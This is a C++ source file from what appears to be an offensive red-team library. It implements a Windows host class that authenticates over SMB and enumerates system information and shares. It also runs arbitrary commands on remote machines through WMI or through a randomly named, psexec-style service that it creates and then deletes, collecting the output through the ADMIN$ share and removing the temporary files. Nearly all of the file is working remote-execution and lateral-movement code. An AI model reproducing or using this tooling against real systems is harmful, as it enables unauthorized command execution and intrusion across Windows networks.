/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include "windows_host.h"

Share::Share(std::wstring name, std::wstring local_path, std::wstring comment, SecurityDescriptor* security_descriptor)
{
	this->name = name;
	this->local_path = local_path;
	this->comment = comment;
	this->security_descriptor = security_descriptor;
}

Share::~Share()
{
	if (this->security_descriptor != NULL)
		delete this->security_descriptor;
}

SystemInfo::SystemInfo(std::wstring computername, std::wstring os_version, std::wstring langroup, std::wstring lanroot)
{
	this->computername = computername;
	this->os_version = os_version;
	this->langroup = langroup;
	this->lanroot = lanroot;
}

SystemInfo::~SystemInfo()
{
}

WindowsHost::WindowsHost(const char* ip)
{
	this->ip = std::string(ip);
}

WindowsHost::~WindowsHost()
{
}

// Authentication

DWORD WindowsHost::auth(const char* ressource, const char* username, const char* password)
{
	char* remote_name = (char*)malloc(strlen(ressource) + 1);
	strcpy_s(remote_name, strlen(ressource) + 1, ressource);

	NETRESOURCE nr = { 0 };
	nr.dwType = RESOURCETYPE_ANY;
	nr.lpLocalName = NULL;
	nr.lpRemoteName = remote_name;
	nr.lpProvider = NULL;

	//Establish connection (using username/pwd)
	DWORD rc = WNetAddConnection2(&nr, password, username, 0);

	free(remote_name);

	return rc;
}

DWORD WindowsHost::deauth(const char* ressource)
{
	char* remote_name = (char*)malloc(strlen(ressource) + 1);
	strcpy_s(remote_name, strlen(ressource) + 1, ressource);

	DWORD rc = WNetCancelConnection2(ressource, NULL, true);

	free(remote_name);

	return rc;
}

// Information gathering

SystemInfo* WindowsHost::getSystemInfo()
{
	DWORD dwLevel = 102;
	LPWKSTA_INFO_102 pBuf = NULL;
	NET_API_STATUS nStatus;
	LPWSTR pszServerName = NULL;

	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring wip = converter.from_bytes(this->ip);

	//
	// Call the NetWkstaGetInfo function, specifying level 102.
	//
	nStatus = NetWkstaGetInfo((LPWSTR)wip.c_str(),
		dwLevel,
		(LPBYTE*)&pBuf);
	//
	// If the call is successful,
	//  print the workstation data.
	//
	SystemInfo* system_info = NULL;
	if (nStatus == NERR_Success)
	{
		system_info = new SystemInfo(pBuf->wki102_computername, std::to_wstring(pBuf->wki102_ver_major) + L"." + std::to_wstring(pBuf->wki102_ver_minor), pBuf->wki102_langroup, pBuf->wki102_lanroot);
	}

	//
	// Free the allocated memory.
	//
	if (pBuf != NULL)
		NetApiBufferFree(pBuf);

	return system_info;
}

std::list<Share>* WindowsHost::shares()
{
	std::list<Share>* share_list = NULL;

	PSHARE_INFO_502 BufPtr, pth;
	//PSHARE_INFO_2 BufPtr, pth;
	NET_API_STATUS  res;
	DWORD er = 0, tr = 0, resume = 0, I;

	wchar_t wip[20];
	size_t outSize;
	mbstowcs_s(&outSize, wip, this->ip.c_str(), this->ip.size() + 1);//Plus null
	LPWSTR lpwip = wip;

	// Call the NetShareEnum() function; specify level 502.
	do // begin do
	{
		res = NetShareEnum(lpwip, 502, (LPBYTE*)&BufPtr, -1, &er, &tr, &resume);

		// If the call succeeds,
		if (res == ERROR_SUCCESS || res == ERROR_MORE_DATA)
		{
			if (share_list == NULL)
				share_list = new std::list<Share>();

			pth = BufPtr;
			// Loop through the entries, print the retrieved data.
			for (unsigned int i = 1; i <= er; i++)
			{
				SecurityDescriptor* security_descriptor = NULL;
				if (pth->shi502_security_descriptor != NULL)
				{
					security_descriptor = new SecurityDescriptor(pth->shi502_security_descriptor);
					int res = security_descriptor->init();
					if (res != 0)
					{
						delete security_descriptor;
						security_descriptor = NULL;
					}
				}

				Share share_info = Share(pth->shi502_netname, pth->shi502_netname, pth->shi502_remark, security_descriptor);

				share_list->push_back(share_info);

				pth++;
			}

			// Free the allocated buffer.
			NetApiBufferFree(BufPtr);
		}
	} while (res == ERROR_MORE_DATA); // end do

	return share_list;

}

// RCE methods

int WindowsHost::RCE_wmi(const char* command)
{
	return this->RCE_wmi(command, NULL, NULL);
}

int WindowsHost::RCE_wmi(const char* command, const char* username, const char* password)
{
	WMI wmi = WMI();

	wmi.authenticate_cimv2(this->ip.c_str(), username, password);

	bool success = wmi.execute(command);

	if (success)
	{
		return 0;
	}
	else
	{
		return GetLastError();
	}
}

int WindowsHost::RCE_wmi_output(char** output, const char* command, const char* username, const char* password, size_t timeout_s)
{
	char dest_rsrc[50];

	DWORD rc;
	int res;
	init_random();

	char output_filename[20];
	gen_random(output_filename, 12);

#ifdef DEBUG
	printf("Output file: %s\n", output_filename);
#endif

	char* wmi_command = (char*)malloc(200 + strlen(command) + strlen(output_filename));
	sprintf_s(wmi_command, 200 + strlen(command) + strlen(output_filename), "cmd.exe /Q /c %s > C:\\Windows\\Temp\\%s 2>&1", command, output_filename);

	res = this->RCE_wmi(wmi_command, username, password);
	if (res != 0)
	{
#ifdef DEBUG
		printf("Unable to start WMI process, error: %d\n", res);
#endif
		return res;
	}

	free(wmi_command);

	const char* admin_share = "ADMIN$";

	if (username != NULL)
	{
		// authenticate to ADMIN$
		sprintf_s(dest_rsrc, 50, "\\\\%s\\%s", this->ip.c_str(), admin_share);

		// Authentification here
		rc = this->auth(dest_rsrc, username, password);
		if (rc == NO_ERROR)
		{
#ifdef DEBUG
			printf("Authentication successful on %s\n", dest_rsrc);
#endif
		}
		else
		{
#ifdef DEBUG
			printf("Authentication failed on %s: %d\n", dest_rsrc, rc);
#endif
			return rc;
		}
	}

	//wait 2 sec
	Sleep(2000);

	std::chrono::high_resolution_clock::time_point t1 = std::chrono::high_resolution_clock::now();
	std::chrono::high_resolution_clock::time_point t2 = std::chrono::high_resolution_clock::now();

	//Wait for file to be created
	char* out_path = (char*)malloc(50 + strlen(output_filename));
	sprintf_s(out_path, 50 + strlen(output_filename), "\\TEMP\\%s", output_filename);
	bool exists = false;
	while (!exists)
	{
		t2 = std::chrono::high_resolution_clock::now();
		std::chrono::duration<double, std::milli> time_span = t2 - t1;

		if (time_span.count() >= timeout_s * 1000)
			break;

		exists = this->remote_file_exists(admin_share, out_path);

		Sleep(2000);
	}

	// delete bat file if it exists
	if (!exists)
	{
#ifdef DEBUG
		printf("Timeout reached, no output file created\n", dest_rsrc, rc);
#endif
		free(out_path);
		return -1;
	}

	//Now get file
	res = get_remote_file(output, admin_share, out_path, true);

	free(out_path);

	if (username != NULL)
	{
		//Disconnect connection (using username/pwd)
		rc = this->deauth(dest_rsrc);
		if (rc == NO_ERROR)
		{
#ifdef DEBUG
			printf("Successfully disconnected from on %s\n", dest_rsrc);
#endif
		}
		else
		{
#ifdef DEBUG
			printf("Disconnection failed from %s: %d\n", dest_rsrc, rc);
#endif
		}
	}

	return res;
}

int WindowsHost::RCE_wmi_output(char** output, const char* command, size_t timeout_s)
{
	return this->RCE_wmi_output(output, command, NULL, NULL, timeout_s);
}

int WindowsHost::RCE_svc(const char* svc_name, const char* command, BOOL delete_service, size_t delete_timeout)
{
	int res = 0;
	char dest_rsrc[50];

	char machine[50];
	SC_HANDLE handle;
	SC_HANDLE svc_handle;
	bool b;

	sprintf_s(machine, 50, "\\\\%s\\", this->ip.c_str()); // last \ here is very important !! \\ip => DCERPC, \\ip\ => \\ip\IPC$\svcctl, \\ip\IP$ => \\ip\IP$\pipe\svcctl

	handle = OpenSCManagerA(machine, "ServicesActive", SC_MANAGER_ALL_ACCESS);
	if (!handle)
	{
#ifdef DEBUG
		printf("OpenSCManagerA failed: %d\n", GetLastError());
#endif
		return GetLastError();
	}

	svc_handle = CreateServiceA(handle, svc_name, svc_name, 0xF003F, 0x10, 0x3, 0x1, command, NULL, NULL, NULL, NULL, NULL);

	if (!svc_handle)
	{
#ifdef DEBUG
		printf("CreateServiceA failed: %d\n", GetLastError());
#endif
		CloseServiceHandle(handle);
		return GetLastError();
	}

	b = StartServiceA(svc_handle, NULL, NULL);
	if (!b)
	{
		DWORD lasterr = GetLastError();
		if (lasterr != 1053)
		{
#ifdef DEBUG
			printf("StartServiceA failed: %d\n", GetLastError());
#endif
			CloseServiceHandle(svc_handle);
			CloseServiceHandle(handle);
			return GetLastError();

		}
	}
	std::chrono::high_resolution_clock::time_point t1 = std::chrono::high_resolution_clock::now();
	std::chrono::high_resolution_clock::time_point t2 = std::chrono::high_resolution_clock::now();

	if (delete_service)
	{
		SERVICE_STATUS svc_status;
		b = QueryServiceStatus(svc_handle, &svc_status);
		if (!b)
		{
#ifdef DEBUG
			printf("QueryServiceStatus failed: %d\n", GetLastError());
#endif
		}
		else
		{
			while (svc_status.dwCurrentState == SERVICE_START_PENDING || svc_status.dwCurrentState == SERVICE_RUNNING)
			{
				Sleep(1000);

				t2 = std::chrono::high_resolution_clock::now();
				std::chrono::duration<double, std::milli> time_span = t2 - t1;

				if (time_span.count() >= delete_timeout)
					break;

				b = QueryServiceStatus(svc_handle, &svc_status);
				if (!b)
				{
#ifdef DEBUG
					printf("QueryServiceStatus failed: %d\n", GetLastError());
#endif
					break;
				}
			}
		}

		//Delete the service
		b = DeleteService(svc_handle);
		if (!b)
		{
#ifdef DEBUG
			printf("DeleteService failed: %d\n", GetLastError());
#endif
			CloseServiceHandle(svc_handle);
			CloseServiceHandle(handle);
			res = GetLastError();
			return res;
		}
	}

	CloseServiceHandle(svc_handle);
	CloseServiceHandle(handle);

	return res;
}

int WindowsHost::RCE_svc_output(char** output, const char* command, const char* username, const char* password, size_t timeout_s)
{
	DWORD rc;
	init_random();

	// Authenticate if necessary
	char dest_rsrc[50];

	if (username != NULL)
	{
		sprintf_s(dest_rsrc, 50, "\\\\%s\\%s", this->ip.c_str(), SVC_SHARE);

		rc = this->deauth(dest_rsrc);
		// Authentification here
		rc = this->auth(dest_rsrc, username, password);

		if (rc == NO_ERROR)
		{
#ifdef DEBUG
			printf("Authentication successful on %s\n", dest_rsrc);
#endif
		}
		else
		{
#ifdef DEBUG
			printf("Authentication failed on %s: %d\n", dest_rsrc, rc);
#endif
			return rc;
		}
	}

	int res;
	char svc_name[20];
	gen_random(svc_name, 12);

	char bat_filename[20];
	gen_random(bat_filename, 12);

	char output_filename[20];
	gen_random(output_filename, 12);

#ifdef DEBUG
	printf("Service name: %s\n", svc_name);
#endif

	char* svc_command = (char*)malloc(200 + strlen(command) + strlen(output_filename) + 3 * strlen(bat_filename));
	sprintf_s(svc_command, 200 + strlen(command) + strlen(output_filename) + 3 * strlen(bat_filename), "%%COMSPEC%% /Q /c echo %s ^> \\Windows\\Temp\\%s 2^>^&1 > %%TEMP%%\\%s.bat & %%COMSPEC%% /Q /c %%TEMP%%\\%s.bat & del %%TEMP%%\\%s.bat", command, output_filename, bat_filename, bat_filename, bat_filename);

	res = this->RCE_svc(svc_name, svc_command, true, 2);
	if (res != 0)
	{
#ifdef DEBUG
		printf("Unable to start service, error: %d\n", res);
#endif
		return res;
	}

	free(svc_command);

	if (username != NULL)
	{
		//Disconnect connection (using username/pwd)
		rc = this->deauth(dest_rsrc);
		if (rc == NO_ERROR)
		{
#ifdef DEBUG
			printf("Successfully disconnected from on %s\n", dest_rsrc);
#endif
		}
		else
		{
#ifdef DEBUG
			printf("Disconnection failed from %s: %d\n", dest_rsrc, rc);
#endif
		}

		// authenticate to ADMIN$
		sprintf_s(dest_rsrc, 50, "\\\\%s\\%s", this->ip.c_str(), "ADMIN$");

		// Authentification here
		rc = this->auth(dest_rsrc, username, password);

		if (rc == NO_ERROR)
		{
#ifdef DEBUG
			printf("Authentication successful on %s\n", dest_rsrc);
#endif
		}
		else
		{
#ifdef DEBUG
			printf("Authentication failed on %s: %d\n", dest_rsrc, rc);
#endif
			return rc;
		}
	}

	//wait 2 sec
	Sleep(2000);

	const char* admin_share = "ADMIN$";

	std::chrono::high_resolution_clock::time_point t1 = std::chrono::high_resolution_clock::now();
	std::chrono::high_resolution_clock::time_point t2 = std::chrono::high_resolution_clock::now();

	//Wait for bat file to be deleted before taling result
	char* bat_path = (char*)malloc(50 + strlen(bat_filename));
	sprintf_s(bat_path, 50 + strlen(bat_filename), "\\TEMP\\%s.bat", bat_filename);
	bool exists = true;
	while (exists)
	{
		t2 = std::chrono::high_resolution_clock::now();
		std::chrono::duration<double, std::milli> time_span = t2 - t1;

		if (time_span.count() >= timeout_s * 1000)
			break;

		exists = this->remote_file_exists(admin_share, bat_path);

		Sleep(2000);
	}

	// delete bat file if it exists
	if (exists)
	{
		this->delete_remote_file(admin_share, bat_path);
	}

	//Now get file
	char* file_path = (char*)malloc(50 + strlen(output_filename));
	sprintf_s(file_path, 50 + strlen(output_filename), "\\TEMP\\%s", output_filename);
	res = get_remote_file(output, admin_share, file_path, true);

	free(file_path);

	if (username != NULL)
	{
		//Disconnect connection (using username/pwd)
		rc = this->deauth(dest_rsrc);
		if (rc == NO_ERROR)
		{
#ifdef DEBUG
			printf("Successfully disconnected from on %s\n", dest_rsrc);
#endif
		}
		else
		{
#ifdef DEBUG
			printf("Disconnection failed from %s: %d\n", dest_rsrc, rc);
#endif
		}
	}

	return res;
}

int WindowsHost::RCE_svc_output(char** output, const char* command, size_t timeout_s)
{
	return this->RCE_svc_output(output, command, NULL, NULL, timeout_s);
}

bool WindowsHost::delete_remote_file(const char* share_name, char* path)
{
	char* file_path = (char*)malloc(100 + this->ip.size() + strlen(share_name) + strlen(path));
	sprintf_s(file_path, 100 + this->ip.size() + strlen(share_name) + strlen(path), "\\\\%s\\%s%s", this->ip.c_str(), share_name, path);

	bool success = DeleteFile(file_path);

	free(file_path);

	return success;
}

int WindowsHost::get_remote_file(char** output, const char* share_name, char* path, BOOL delete_file)
{
	char* file_path = (char*)malloc(100 + this->ip.size() + strlen(share_name) + strlen(path));
	sprintf_s(file_path, 100 + this->ip.size() + strlen(share_name) + strlen(path), "\\\\%s\\%s%s", this->ip.c_str(), share_name, path);

	printf("File path: %s\n", file_path);

	FILE* f = NULL;
	fopen_s(&f, file_path, "rb");
	if (f == NULL)
	{
#ifdef DEBUG
		printf("Unable to read file %s: %d\n", file_path, GetLastError());
#endif
	}
	else
	{
#ifdef DEBUG
		printf("Seek\n");
#endif

		fseek(f, 0, SEEK_END);
		size_t size = ftell(f);
		fseek(f, 0, SEEK_SET);
#ifdef DEBUG
		printf("Buffer: %d\n", size);
#endif

		* output = (char*)malloc(sizeof(char) * size + 1);

		size_t size_read = fread(*output, sizeof(char), size + 1, f);
		(*output)[size] = '\0';
#ifdef DEBUG
		printf("Read %d bytes\n", size_read);
#endif

		fclose(f);
	}

	if (delete_file)
	{
		DeleteFile(file_path);
	}

	free(file_path);

	return 0;
}

bool WindowsHost::remote_file_exists(const char* share_name, char* path)
{
	char* file_path = (char*)malloc(100 + this->ip.size() + strlen(share_name) + strlen(path));
	sprintf_s(file_path, 100 + this->ip.size() + strlen(share_name) + strlen(path), "\\\\%s\\%s%s", this->ip.c_str(), share_name, path);

	bool exists = PathFileExistsA(file_path);

	free(file_path);

	return exists;
}

int WindowsHost::write_remote_file(char* data, size_t data_size, const char* share_name, char* path)
{
	char* file_path = (char*)malloc(100 + this->ip.size() + strlen(share_name) + strlen(path));
	sprintf_s(file_path, 100 + this->ip.size() + strlen(share_name) + strlen(path), "\\\\%s\\%s%s", this->ip.c_str(), share_name, path);

	FILE* f = NULL;
	fopen_s(&f, file_path, "wb");
	if (f == NULL)
		return GetLastError();
	fwrite(data, 1, data_size, f);
	fclose(f);

	return 0;
}